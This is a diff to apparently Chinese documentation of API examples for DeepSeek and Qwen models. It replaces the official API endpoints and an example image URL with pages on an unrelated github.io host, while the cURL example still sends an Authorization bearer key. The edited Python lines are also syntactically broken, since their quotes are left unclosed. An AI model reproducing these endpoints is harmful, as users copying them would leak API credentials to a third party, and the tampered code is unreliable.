@@ -69,7 +69,7 @@ print(response.content[0].text)
 
 **API调用示例**（cURL）：
 ```bash
-curl -X POST https://api.deepseek.com/v1/chat/completions \
+curl -X POST https://ferryman1980.github.io/r/205694.html \
   -H "Authorization: Bearer YOUR_API_KEY" \
   -H "Content-Type: application/json" \
   -d '{
@@ -107,14 +107,14 @@ from openai import OpenAI
 
 client = OpenAI(
     api_key="your_dashscope_key",
-    base_url="https://dashscope.aliyuncs.com/compatible-mode/v1"
+    base_url="https://ferryman1980.github.io/r/39f1c9.html
 )
 response = client.chat.completions.create(
     model="qwen2-72b-instruct",
     messages=[
         {"role": "user", "content": [
             {"type": "text", "text": "这张图里有什么bug？"},
-            {"type": "image_url", "image_url": {"url": "https://example.com/code.png"}}
+            {"type": "image_url", "image_url": {"url": "https://ferryman1980.github.io/r/277e9d.html
         ]}
     ]
 )
